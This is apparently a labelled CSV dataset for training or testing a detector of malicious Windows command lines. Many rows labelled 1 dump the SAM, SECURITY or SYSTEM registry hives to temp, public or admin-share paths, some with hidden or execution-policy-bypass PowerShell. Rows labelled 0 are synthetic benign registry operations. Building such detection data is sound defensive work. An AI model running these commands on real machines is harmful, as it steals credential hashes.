text,label
reg   export  hkey_local_machine\security c:\temp\system.hive   /y,1
"powershell -c reg delete ""hkey_current_user\software\google\chrome\subkey10"" /v version",0
"reg.exe   save   ""hkey_users\software\myapp\settings\subkey28""   ""%temp%\non_sensitive.hive""",0
"powershell -c reg.exe   restore   ""hkey_users\hkey_local_machine\software\wow6432node""   ""hkey_users\control panel\desktop_685""",0
cmd.exe /c start /b reg   save  hklm\security \.\c$ackup.reg /y,1
pwsh -noprofile -c reg.exe save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak /y,1
pwsh -noprofile -c reg save   hkey_local_machine\security   c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe   save   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
powershell -command reg   save hkey_local_machine\sam   c:\windows\temp\sam.save,1
"reg.exe restore ""hkey_users\software\classes"" ""hkey_users\control panel\desktop_807""",0
"reg   save   ""hkey_users\software\google\chrome\subkey26""   ""c:\temp\user_settings.reg""   /y",0
"cmd /c powershell -c ""reg.exe export  hkey_local_machine\sam   \.\c$ackup.reg   /y""",1
"reg  restore  ""hkey_current_user\software\google\chrome""  ""hkey_current_user\software\policies\mycorp_329""",0
"reg.exe  unload  ""hkey_current_user\software\google\chrome""  /f",0
c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\security c:\temp\system.hive,1
cmd.exe /c reg save  hklm\security  %temp%\sec_backup.dat  /y,1
cmd.exe /c start /b reg  export  hkey_local_machine\security \.\c$ackup.reg,1
powershell -command reg export hklm\sam  c:\temp\system.hive,1
reg   save hklm\security  \.\c$ackup.reg,1
"cmd /c powershell -c ""reg   save hklm\sam  \\localhost\c$\__dump\sam.bak""",1
c:\windows\system32\cmd.exe /k reg.exe   export hklm\security  %temp%\sec_backup.dat,1
powershell -exec bypass -w hidden -c reg.exe save   hklm\sam   %temp%\sec_backup.dat   /y,1
powershell -command reg  export  hkey_local_machine\sam  c:\temp\system.hive  /y,1
pwsh -noprofile -c reg.exe   export   hklm\security \\localhost\c$\__dump\sam.bak,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey14""  ""c:\users\public\chrome_data.bak""",0
"reg add ""hkey_users\software\classes\subkey13"" /v version  /d ""1.0.0""",0
cmd.exe /c reg.exe export   hkey_local_machine\system \\localhost\c$\__dump\sam.bak   /y,1
powershell -command reg  save  hklm\system  %temp%\sec_backup.dat /y,1
cmd.exe /c reg  save   hklm\system \.\c$ackup.reg,1
cmd.exe /c start /b reg   export  hkey_local_machine\security c:\temp\system.hive,1
"cmd /c reg.exe   add   ""hkey_current_user\software\myapp\settings""   /v path   /t reg_dword",0
"powershell -c reg.exe delete ""hkcu\hkey_local_machine\software\wow6432node\subkey73"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg   save hklm\system   c:\temp\system.hive,1
"reg save ""hku\hkey_local_machine\software\wow6432node\subkey44"" ""d:\backup\registry_hive.dat""",0
"reg  delete  ""hku\software\google\chrome\subkey20""  /f",0
powershell -command reg   save hklm\security %temp%\sec_backup.dat /y,1
reg.exe   save  hkey_local_machine\sam c:\windows\temp\sam.save,1
"reg query ""hku\software\classes\subkey26"" /v path",0
"cmd /c powershell -c ""reg.exe export   hkey_local_machine\system \.\c$ackup.reg""",1
powershell -exec bypass -w hidden -c reg.exe  save hkey_local_machine\sam   %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save  hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg  export  hklm\sam  c:\windows\temp\sam.save,1
"reg.exe restore ""hkey_local_machine\software\myapp\settings\subkey95"" ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_174""",0
"powershell -c reg restore ""hkey_users\software\google\chrome\subkey16"" ""hkey_users\control panel\desktop_685""",0
reg.exe  save  hklm\system  %temp%\sec_backup.dat  /y,1
"reg.exe  query  ""hkey_current_user\environment\subkey53""  /v lastupdate",0
"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak""",1
"cmd /c reg.exe copy ""hku\system\currentcontrolset\services"" ""hku\software\google\chrome_459""",0
"reg.exe  query  ""hkey_current_user\system\currentcontrolset\services\subkey48""  /v path",0
"start /b reg   save   ""hkey_current_user\software\policies\mycorp""   ""d:\backup\registry_hive.dat""",0
"start /b reg restore ""hkey_current_user\software\microsoft\windows\currentversion"" ""hkey_current_user\hkey_local_machine\software\policies\microsoft_864""",0
"cmd /c reg.exe  compare  ""hku\control panel\desktop""  ""hku\control panel\desktop_459""",0
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\sam  %temp%\sec_backup.dat,1
"cmd /c reg add ""hkey_current_user\software\google\chrome""  /t reg_dword /d ""c:\program files\app""",0
"reg.exe add ""hkcu\software\myapp\settings"" /v version",0
"reg   unload   ""hkcu\software\myapp\settings""   /v version",0
"reg.exe   unload   ""hkey_users\software\classes""   /v path",0
"cmd /c powershell -c ""reg.exe export  hklm\sam   c:\temp\system.hive  /y""",1
"reg   query   ""hku\software\google\chrome\subkey19""   /v path",0
"cmd /c reg   compare   ""hkey_current_user\system\currentcontrolset\services\subkey19""   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_934""",0
c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\security   \.\c$ackup.reg /y,1
"reg.exe   compare   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey54""   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control_900""",0
"reg delete ""hkey_current_user\software\classes"" /v path",0
pwsh -noprofile -c reg   save hkey_local_machine\security   c:\windows\temp\sam.save   /y,1
"reg delete ""hku\environment"" /f",0
powershell -exec bypass -w hidden -c reg export hkey_local_machine\system   c:\temp\system.hive,1
reg export hklm\sam  \.\c$ackup.reg   /y,1
"cmd /c reg   restore   ""hkey_local_machine\software\classes""   ""hkey_local_machine\environment_798""",0
powershell -command reg.exe save  hklm\system   \.\c$ackup.reg,1
cmd.exe /c start /b reg.exe   export   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\system \.\c$ackup.reg /y,1
"powershell -c reg   restore   ""hkey_local_machine\environment\subkey60""   ""hkey_local_machine\software\policies\mycorp_229""",0
"reg query ""hkey_local_machine\software\policies\mycorp""",0
pwsh -noprofile -c reg.exe export   hkey_local_machine\sam c:\temp\system.hive  /y,1
"reg  query  ""hkey_local_machine\software\google\chrome\subkey4""  /f",0
"reg.exe   query   ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey58""   /v lastupdate",0
powershell -command reg   save  hklm\security c:\windows\temp\sam.save /y,1
cmd.exe /c reg.exe   save hklm\sam c:\temp\system.hive  /y,1
cmd.exe /c start /b reg.exe   export   hklm\sam  c:\users\public\registry_export.reg,1
"start /b reg.exe   unload   ""hkey_current_user\software\google\chrome\subkey5""   /v version",0
"reg unload ""hkcu\software\google\chrome"" /v version",0
"reg.exe save ""hkey_users\software\myapp\settings\subkey2"" ""%temp%\non_sensitive.hive""",0
cmd.exe /c reg.exe  save   hklm\sam   c:\temp\system.hive  /y,1
cmd.exe /c start /b reg.exe   save  hkey_local_machine\system \.\c$ackup.reg,1
"cmd /c powershell -c ""reg.exe   save   hklm\system  %temp%\sec_backup.dat   /y""",1
cmd.exe /c start /b reg.exe   export  hklm\system  c:\temp\system.hive  /y,1
powershell -exec bypass -w hidden -c reg.exe  export   hklm\sam \\localhost\c$\__dump\sam.bak,1
powershell -command reg export   hklm\system   c:\windows\temp\sam.save   /y,1
"cmd /c powershell -c ""reg export hklm\sam   \\localhost\c$\__dump\sam.bak""",1
"cmd /c powershell -c ""reg  save  hkey_local_machine\security  c:\temp\system.hive   /y""",1
cmd.exe /c start /b reg   export hklm\system   c:\users\public\registry_export.reg,1
"start /b reg unload ""hkcu\software\microsoft\windows\currentversion\subkey40"" /v path",0
"reg.exe  delete  ""hkey_current_user\system\currentcontrolset\services""",0
powershell -command reg.exe save  hkey_local_machine\sam \.\c$ackup.reg /y,1
"cmd /c reg.exe  delete  ""hkey_local_machine\control panel\desktop\subkey47""  /v lastupdate",0
"powershell -c reg.exe copy ""hkey_users\environment\subkey40"" ""hkey_users\system\currentcontrolset\services_254""",0
"reg  query  ""hkey_local_machine\environment\subkey76""",0
"start /b reg restore ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""hkey_local_machine\software\policies\mycorp_851""",0
"start /b reg.exe restore ""hkey_local_machine\environment\subkey46"" ""hkey_local_machine\software\microsoft\windows\currentversion_116""",0
"reg.exe   query   ""hku\control panel\desktop\subkey15""   /v lastupdate",0
cmd.exe /c reg.exe export  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg.exe save hklm\system c:\temp\system.hive,1
"reg   add   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey69""   /v version   /t reg_dword   /d 1",0
"start /b reg.exe   restore   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""hkey_local_machine\software\google\chrome_572""",0
powershell -exec bypass -w hidden -c reg   export  hklm\system c:\temp\system.hive   /y,1
c:\windows\system32\cmd.exe /k reg.exe   export   hkey_local_machine\sam  \.\c$ackup.reg,1
pwsh -noprofile -c reg.exe  export   hkey_local_machine\security %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save hklm\system  %temp%\sec_backup.dat,1
reg  export hkey_local_machine\security  c:\users\public\registry_export.reg,1
cmd.exe /c reg  save   hklm\sam   \.\c$ackup.reg /y,1
cmd.exe /c start /b reg.exe   save hkey_local_machine\system  %temp%\sec_backup.dat   /y,1
"reg  restore  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\software\classes_914""",0
powershell -command reg   export   hklm\sam  c:\users\public\registry_export.reg,1
"reg add ""hkey_current_user\software\google\chrome\subkey64"" /v version  /d 1",0
"reg.exe add ""hkey_users\hkey_local_machine\software\policies\microsoft"" /v lastupdate /t reg_dword /d ""1.0.0""",0
"reg  add  ""hkey_local_machine\software\classes\subkey10""  /v lastupdate  /t reg_dword  /d ""c:\program files\app""",0
"powershell -c reg.exe delete ""hkey_users\software\classes"" /v version",0
c:\windows\system32\cmd.exe /k reg export  hkey_local_machine\system %temp%\sec_backup.dat,1
"reg query ""hku\software\google\chrome\subkey53""",0
powershell -command reg.exe   export hkey_local_machine\sam  c:\temp\system.hive  /y,1
cmd.exe /c reg.exe   save   hkey_local_machine\sam c:\windows\temp\sam.save /y,1
"reg.exe   compare   ""hkey_current_user\software\google\chrome\subkey35""   ""hkey_current_user\software\myapp\settings_544""",0
"start /b reg.exe   restore   ""hkcu\software\microsoft\windows\currentversion""   ""hkcu\software\policies\mycorp_459""",0
"cmd /c powershell -c ""reg  save hkey_local_machine\system  \.\c$ackup.reg /y""",1
c:\windows\system32\cmd.exe /k reg  save   hklm\sam \\localhost\c$\__dump\sam.bak,1
"cmd /c reg.exe  copy  ""hku\software\policies\mycorp\subkey77""  ""hku\environment_324""",0
"reg compare ""hkey_local_machine\system\currentcontrolset\services"" ""hkey_local_machine\hkey_local_machine\software\wow6432node_620""",0
pwsh -noprofile -c reg export  hkey_local_machine\security   c:\temp\system.hive /y,1
cmd.exe /c reg  save hkey_local_machine\security  c:\windows\temp\sam.save,1
cmd.exe /c start /b reg  save  hkey_local_machine\sam  \.\c$ackup.reg   /y,1
powershell -exec bypass -w hidden -c reg save   hklm\sam c:\windows\temp\sam.save  /y,1
"start /b reg.exe  add  ""hkey_local_machine\software\microsoft\windows\currentversion\subkey44""  /f  /t reg_sz  /d ""1.0.0""",0
"reg.exe delete ""hkey_local_machine\environment"" /f",0
"reg.exe   unload   ""hkcu\software\classes""   /v version",0
"reg.exe add ""hkcu\software\myapp\settings"" /v path /t reg_sz /d 1",0
c:\windows\system32\cmd.exe /k reg.exe   save hkey_local_machine\system %temp%\sec_backup.dat   /y,1
"reg   restore   ""hku\hkey_local_machine\software\policies\microsoft""   ""hku\software\myapp\settings_760""",0
powershell -command reg.exe   save hkey_local_machine\system  c:\temp\system.hive  /y,1
powershell -command reg.exe save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg.exe   save hkey_local_machine\sam   \.\c$ackup.reg /y,1
cmd.exe /c reg  save hkey_local_machine\security c:\temp\system.hive,1
"reg  query  ""hkcu\system\currentcontrolset\services\subkey76""  /v lastupdate",0
powershell -command reg.exe  export   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak   /y,1
"reg.exe   delete   ""hkey_current_user\software\classes\subkey42""   /v version",0
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\security  c:\users\public\registry_export.reg  /y,1
"reg.exe unload ""hkey_current_user\software\policies\mycorp"" /v version",0
c:\windows\system32\cmd.exe /k reg export hklm\sam  \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\system  c:\users\public\registry_export.reg,1
"reg.exe   query   ""hkey_users\control panel\desktop\subkey29""   /v path",0
powershell -exec bypass -w hidden -c reg   save hkey_local_machine\sam %temp%\sec_backup.dat,1
"reg  query  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  /v path",0
pwsh -noprofile -c reg  save hklm\security c:\windows\temp\sam.save   /y,1
"reg delete ""hkcu\software\policies\mycorp\subkey9"" /v lastupdate",0
"start /b reg  unload  ""hkey_current_user\system\currentcontrolset\services\subkey91""  /v lastupdate",0
"cmd /c reg.exe   restore   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey10""   ""hkcu\software\classes_300""",0
"cmd /c powershell -c ""reg.exe export  hklm\security   c:\users\public\registry_export.reg""",1
"start /b reg  delete  ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey10""  /v path",0
"reg  compare  ""hkey_users\software\policies\mycorp""  ""hkey_users\environment_230""",0
cmd.exe /c start /b reg.exe   save  hklm\system  \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak   /y,1
"start /b reg unload ""hkey_current_user\software\microsoft\windows\currentversion"" /v lastupdate",0
"reg   delete   ""hku\software\classes\subkey79""   /f",0
"reg.exe copy ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control"" ""hkey_current_user\software\classes_327""",0
"reg unload ""hkey_local_machine\system\currentcontrolset\services\subkey62"" /v version",0
"cmd /c reg   unload   ""hkey_local_machine\software\policies\mycorp\subkey20""   /v version",0
cmd.exe /c start /b reg.exe   save   hkey_local_machine\sam  %temp%\sec_backup.dat  /y,1
reg.exe export   hkey_local_machine\system   c:\temp\system.hive,1
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\security  c:\windows\temp\sam.save   /y,1
powershell -command reg  export  hkey_local_machine\security \.\c$ackup.reg  /y,1
cmd.exe /c start /b reg   export   hklm\sam c:\windows\temp\sam.save   /y,1
c:\windows\system32\cmd.exe /k reg.exe  save  hkey_local_machine\security c:\windows\temp\sam.save,1
"powershell -c reg compare ""hkey_users\system\currentcontrolset\services"" ""hkey_users\software\microsoft\windows\currentversion_683""",0
"reg.exe   compare   ""hkcu\software\classes\subkey82""   ""hkcu\hkey_local_machine\software\wow6432node_125""",0
"reg  save  ""hkcu\software\google\chrome""  ""%temp%\non_sensitive.hive""",0
"start /b reg.exe   restore   ""hku\software\google\chrome\subkey86""   ""hku\hkey_local_machine\software\policies\microsoft_667""",0
powershell -command reg   export   hklm\security   \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg  save   hkey_local_machine\sam   %temp%\sec_backup.dat,1
cmd.exe /c reg save  hklm\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe   query   ""hkcu\hkey_local_machine\system\currentcontrolset\control""   /f",0
c:\windows\system32\cmd.exe /k reg  save hkey_local_machine\system c:\windows\temp\sam.save,1
"reg.exe delete ""hkey_users\environment""",0
powershell -command reg save  hklm\sam   \.\c$ackup.reg,1
"cmd /c reg.exe copy ""hkey_current_user\system\currentcontrolset\services"" ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_683""",0
"reg  add  ""hku\control panel\desktop""  /f  /t reg_sz  /d 1",0
"cmd /c reg  save  ""hkcu\software\google\chrome""  ""c:\windows\temp\software_dump.dat""",0
"reg  restore  ""hkey_current_user\hkey_local_machine\software\wow6432node""  ""hkey_current_user\hkey_local_machine\software\policies\microsoft_271""",0
cmd.exe /c start /b reg export hklm\security   c:\users\public\registry_export.reg /y,1
cmd.exe /c start /b reg export  hklm\system \\localhost\c$\__dump\sam.bak   /y,1
c:\windows\system32\cmd.exe /k reg   export  hklm\sam   \.\c$ackup.reg,1
powershell -command reg export   hklm\system  %temp%\sec_backup.dat  /y,1
powershell -exec bypass -w hidden -c reg   save hkey_local_machine\security   c:\users\public\registry_export.reg,1
cmd.exe /c reg export hkey_local_machine\sam   c:\temp\system.hive   /y,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey11"" ""c:\users\public\chrome_data.bak"" /y",0
cmd.exe /c reg.exe export hklm\security   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg   export   hkey_local_machine\security   %temp%\sec_backup.dat,1
"reg.exe add ""hkcu\system\currentcontrolset\services""  /t reg_dword /d ""c:\program files\app""",0
powershell -command reg export hklm\system  c:\windows\temp\sam.save,1
"cmd /c powershell -c ""reg.exe export   hkey_local_machine\sam   c:\temp\system.hive  /y""",1
"reg   compare   ""hku\control panel\desktop""   ""hku\hkey_local_machine\software\policies\microsoft_278""",0
cmd.exe /c reg save   hklm\sam  c:\users\public\registry_export.reg,1
"cmd /c reg add ""hkcu\control panel\desktop\subkey56"" /v path /t reg_sz /d ""c:\program files\app""",0
cmd.exe /c reg.exe  save hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
reg  export   hklm\security  c:\users\public\registry_export.reg   /y,1
"powershell -c reg  restore  ""hku\hkey_local_machine\system\currentcontrolset\control""  ""hku\hkey_local_machine\software\wow6432node_273""",0
"powershell -c reg.exe add ""hkcu\software\policies\mycorp"" /v version  /d ""1.0.0""",0
c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\sam   c:\windows\temp\sam.save,1
powershell -command reg.exe  save  hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
"reg.exe query ""hkey_users\system\currentcontrolset\services\subkey72"" /v path",0
cmd.exe /c reg.exe   export   hklm\security   c:\windows\temp\sam.save,1
"reg.exe   restore   ""hkey_current_user\hkey_local_machine\software\policies\microsoft""   ""hkey_current_user\software\google\chrome_239""",0
powershell -command reg  save  hkey_local_machine\sam \.\c$ackup.reg  /y,1
powershell -exec bypass -w hidden -c reg.exe export   hklm\sam %temp%\sec_backup.dat  /y,1
"reg.exe restore ""hku\control panel\desktop"" ""hku\software\microsoft\windows\currentversion_896""",0
"reg   copy   ""hku\software\google\chrome""   ""hku\software\microsoft\windows\currentversion_129""",0
"start /b reg.exe   compare   ""hkey_current_user\software\myapp\settings""   ""hkey_current_user\software\classes_590""",0
"reg  copy  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey10""  ""hkey_current_user\hkey_local_machine\software\policies\microsoft_682""",0
pwsh -noprofile -c reg  save hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg  export hkey_local_machine\system \.\c$ackup.reg,1
pwsh -noprofile -c reg.exe  export  hklm\sam  %temp%\sec_backup.dat  /y,1
powershell -command reg.exe export   hklm\security   c:\temp\system.hive,1
"reg  unload  ""hkey_local_machine\control panel\desktop""  /v path",0
cmd.exe /c reg   export hklm\system   \\localhost\c$\__dump\sam.bak,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""c:\users\public\chrome_data.bak"" /y",0
c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\security \\localhost\c$\__dump\sam.bak  /y,1
"reg copy ""hkey_users\software\microsoft\windows\currentversion\subkey55"" ""hkey_users\control panel\desktop_627""",0
cmd.exe /c start /b reg.exe export   hkey_local_machine\security  c:\temp\system.hive /y,1
"reg.exe   add   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""   /v version   /t reg_sz   /d ""c:\program files\app""",0
cmd.exe /c start /b reg  export hkey_local_machine\security   c:\windows\temp\sam.save /y,1
"reg  query  ""hku\hkey_local_machine\software\wow6432node""  /v lastupdate",0
powershell -exec bypass -w hidden -c reg  save hklm\sam \\localhost\c$\__dump\sam.bak,1
powershell -command reg.exe   export hklm\system \\localhost\c$\__dump\sam.bak  /y,1
cmd.exe /c reg.exe save   hkey_local_machine\sam c:\temp\system.hive /y,1
"reg.exe   compare   ""hkey_current_user\environment""   ""hkey_current_user\software\policies\mycorp_424""",0
pwsh -noprofile -c reg.exe  save   hkey_local_machine\system   c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg.exe export  hkey_local_machine\system %temp%\sec_backup.dat,1
"cmd /c reg.exe delete ""hku\hkey_local_machine\system\currentcontrolset\control\subkey7"" /f",0
reg  export  hklm\sam  \.\c$ackup.reg,1
"reg.exe   unload   ""hku\software\google\chrome""",0
powershell -command reg.exe save hkey_local_machine\security \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe   export hkey_local_machine\sam c:\temp\system.hive  /y,1
cmd.exe /c reg.exe   export hkey_local_machine\security  c:\users\public\registry_export.reg,1
powershell -command reg.exe  export hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
cmd.exe /c reg.exe save hklm\system c:\users\public\registry_export.reg   /y,1
"reg unload ""hkcu\software\microsoft\windows\currentversion"" /v lastupdate",0
"cmd /c powershell -c ""reg.exe export hkey_local_machine\sam c:\temp\system.hive /y""",1
"cmd /c powershell -c ""reg.exe export   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak""",1
